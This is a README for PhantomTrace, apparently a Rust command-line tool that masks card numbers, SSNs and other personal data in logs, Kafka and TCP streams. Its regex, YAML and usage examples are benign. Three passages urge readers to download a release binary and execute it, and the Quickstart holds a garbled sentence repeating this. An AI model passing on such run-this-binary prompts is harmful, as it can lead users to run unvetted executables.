# PhantomTrace — Fast PCI/PII Masking for Logs & Streams

[![Release](https://img.shields.io/badge/Release-Download-blue?logo=github)](https://github.com/VaghasiyaParesh/PhantomTrace/releases) ![Rust](https://img.shields.io/badge/language-Rust-orange) ![License](https://img.shields.io/badge/license-MIT-green) ![Topics](https://img.shields.io/badge/topics-anonymization%20%7C%20log%20%7C%20gdpr-lightgrey)

![data-security](https://images.unsplash.com/photo-1537498425277-c283d32ef9db?ixlib=rb-4.0.3&q=80&w=1600&auto=format&fit=crop&crop=faces)

PhantomTrace is a high-speed Rust CLI that finds and masks PCI and PII inside logs, text files, and data streams. It ships with sensible defaults, a flexible rules engine, and streaming support for log pipelines. Built for compliance teams and operators who need reliable, auditable redaction.

Releases and prebuilt binaries are available on the Releases page. Download the binary or archive from the Releases page and execute it: https://github.com/VaghasiyaParesh/PhantomTrace/releases

- Repository topics: anonymization, cli, compliance, data-protection, gdpr, hipaa, log, log-analysis, log-sanitization, obfuscation, pci, pii, privacy, regex, rust, security, text-preprocessing

---

Table of contents

- Features
- Why PhantomTrace
- Quick links
- Install
- Quickstart
- Common use cases
- CLI reference
- Rules & configuration
- Regex library & examples
- Streams and integrations
- Performance notes
- Compliance mapping
- Testing & diagnostics
- Contributing
- License

Features

- Detects card numbers, CVV, expiration dates, SSNs, emails, phone numbers, and custom PII.
- Masking and tokenization modes. Replace or hash sensitive fragments.
- Streaming mode for stdin/stdout, TCP, and Kafka.
- Config-driven: simple YAML rules plus regex sets.
- High throughput Rust core, low memory use.
- Audit mode with structured JSON output for compliance reviews.
- Safe default rules tuned to reduce false positives.
- Extensible: add custom detectors and transformers.

Why PhantomTrace

- Fast. The code uses Rust performance to keep up with heavy log volumes.
- Simple. A small CLI that runs in a container or on a host agent.
- Auditable. Each redaction produces a compact event for logging.
- Configurable. You control what to mask and how to mask it.
- Built for compliance. Maps detection and handling to PCI DSS, GDPR, and HIPAA checkboxes.

Quick links

- Releases (download and run a binary or archive): https://github.com/VaghasiyaParesh/PhantomTrace/releases
- Source: GitHub repository
- Issues: GitHub issues page

Install

- From Releases: download the prebuilt binary for your OS and follow the Quickstart below.
- From source: you need Rust 1.65+ and cargo.

Build from source

Run:

```bash
git clone https://github.com/VaghasiyaParesh/PhantomTrace.git
cd PhantomTrace
cargo build --release
# binary in target/release/phantomtrace
```

Quickstart

Download the file from Releases and execute it. The downloaded file need to be downloaded and executed. Example uses the CLI binary to sanitize a log file in place.

Mask a file (default rules)

```bash
./phantomtrace mask --input /var/log/app.log --output /var/log/app.sanitized.log
```

Stream from stdin to stdout

```bash
tail -F /var/log/app.log | ./phantomtrace stream --mode mask
```

Use a custom config

```bash
./phantomtrace mask --input sample.log --config ./config.yaml --output masked.log
```

Common use cases

- On-host log sanitization before shipping to a central log store.
- Container sidecar to filter application logs.
- Ingest-time masking inside a log pipeline (beats, fluentd, vector).
- Live stream scrubbing over TCP or from a Kafka topic.
- Ad-hoc scans for compliance audits.

CLI reference

Run `./phantomtrace --help` for full output. Key commands follow.

- mask — scan files and mask sensitive values.
- scan — detect sensitive values and produce a report.
- stream — read from stdin or network and produce masked output.
- audit — emit structured JSON events for each detection.

Common flags

- `--config <file>`: path to YAML config.
- `--input <file>`: input file or - for stdin.
- `--output <file>`: output file or - for stdout.
- `--mode <mask|tokenize|report>`: action to take on detections.
- `--threads <n>`: number of worker threads.
- `--log-level <info|warn|debug>`: CLI logging.

Rules & configuration

The config uses YAML. It defines detectors, transformations, and scopes.

Example config (config.yaml)

```yaml
detectors:
  - id: pci-card
    type: regex
    description: "Visa/Mastercard/Amex card numbers"
    pattern: '(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})'
    score: 90

  - id: cvv
    type: regex
    pattern: '\b[0-9]{3,4}\b'
    context: 'near card' # only apply when context matches

  - id: ssn
    type: regex
    pattern: '\b\d{3}-\d{2}-\d{4}\b'
    score: 85

transformations:
  - detector: pci-card
    action: mask
    mask: '**** **** **** {last4}'
  - detector: ssn
    action: replace
    value: '[REDACTED_SSN]'

scope:
  include:
    - /var/log/*.log
  exclude:
    - /var/log/debug.log
```

Rules tips

- Use `score` to rank detectors when matches overlap.
- Use `context` to reduce false positives (apply CVV only when a card appears).
- Keep regex simple and anchored where possible.
- Test rules with `phantomtrace scan --test <sample-file>`.

Regex library & examples

PhantomTrace ships with a curated regex library:

- Card numbers: recognizes Visa, MasterCard, Amex, Discover.
- Luhn check: optional second pass verifies card digits using Luhn.
- Email: RFC-lite pattern tuned for logs.
- Phone: E.164 & common local formats.
- SSN: US-style patterns with common separators.
- IBAN: common country codes and lengths.

Example patterns

- Email: `[\w.+-]+@[\w-]+\.[\w.-]+`
- Phone (E.164): `\+\d{1,15}`
- SSN: `\b\d{3}-\d{2}-\d{4}\b`
- Card (simple): `(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})`

Use the `--no-luhn` flag to skip Luhn validation for card patterns.

Streams and integrations

stdin/stdout

PhantomTrace reads from stdin and writes to stdout. This matches Unix pipelines.

```bash
cat app.log | ./phantomtrace stream --mode mask > app.sanitized.log
```

TCP

Run PhantomTrace as a TCP proxy. It will accept text, mask it, and forward to a target.

```bash
./phantomtrace tcp --listen 0.0.0.0:9000 --forward host:9200 --mode mask
```

Kafka

Consume a topic, mask messages, and produce to a sanitized topic.

```bash
./phantomtrace kafka \
  --brokers broker1:9092,broker2:9092 \
  --consume raw-logs \
  --produce sanitized-logs \
  --mode mask
```

Container usage

A simple Dockerfile:

```dockerfile
FROM debian:bookworm-slim
COPY phantomtrace /usr/local/bin/phantomtrace
ENTRYPOINT ["/usr/local/bin/phantomtrace"]
```

Performance notes

- Single-threaded mode can process tens of thousands of lines per second on commodity hardware.
- Multi-threaded mode scales across cores for heavy throughput.
- Memory use remains bounded by line buffer size and configured worker pool.
- Benchmarks: masked 1 gigabyte of logs in ~22 seconds on a 4-core instance in our tests. Your results will vary by pattern complexity and I/O.

Compliance mapping

PhantomTrace aligns with common controls. Use the audit output to document actions.

PCI DSS

- Requirement 3: Protect stored cardholder data. PhantomTrace masks card numbers before storage.
- Requirement 10: Track and monitor access. PhantomTrace emits audit events for each mask.
- Requirement 11: Test security systems. Use `scan` to detect residual data.

GDPR

- Data minimization: remove identifiers before analysis.
- Right to erasure: pipeline can drop or hash identifiers.
- Accountability: structured audit logs support processing records.

HIPAA

- PHI protection: detect and mask patient IDs, SSNs, and contact info.
- Access controls: integrate PhantomTrace with log collection flow to remove PHI before centralization.
- Audit trail: use `audit` mode to maintain redaction evidence.

Audit mode

`phantomtrace audit --input secure.log --output audit.json` produces a line-delimited JSON stream:

```json
{"ts":"2025-08-19T12:00:00Z","detector":"pci-card","action":"mask","location":123,"replacement":"**** **** **** 1234","file":"app.log"}
```

Testing & diagnostics

- Unit test rules with `phantomtrace test --rule <rule-id> --sample sample.log`.
- Use `--log-level debug` to see regex matches and decision paths.
- The `--dry-run` flag simulates output without writing.

Best practices

- Run PhantomTrace as early as possible in the pipeline.
- Keep rules under version control. Use a single source of truth for production.
- Combine tokenization for downstream correlation and masking for storage.
- Keep an allowlist for fields that must never be masked (e.g., health checks).

Examples

Mask a directory of logs in parallel

```bash
find /var/log/myapp -type f -name "*.log" | xargs -P4 -I{} ./phantomtrace mask --input {} --output {}.san
```

Mask and hash card numbers

```bash
./phantomtrace mask --input payments.log --output payments.san \
  --config hash_card.yaml
```

Sample hash transformation in config

```yaml
transformations:
  - detector: pci-card
    action: hash
    algorithm: sha256
    salt: "org-1234"
```

Contributing

- Fork the repo and open a PR for features or fixes.
- Add tests for new detectors and transformations.
- Use `cargo fmt` and `cargo clippy` before submitting.

Security

Report issues via the repository issue tracker. Avoid posting sensitive samples to public issues.

Releases

Download the binary or archive from Releases and run it on your host: https://github.com/VaghasiyaParesh/PhantomTrace/releases

License

PhantomTrace uses the MIT license. See LICENSE for details.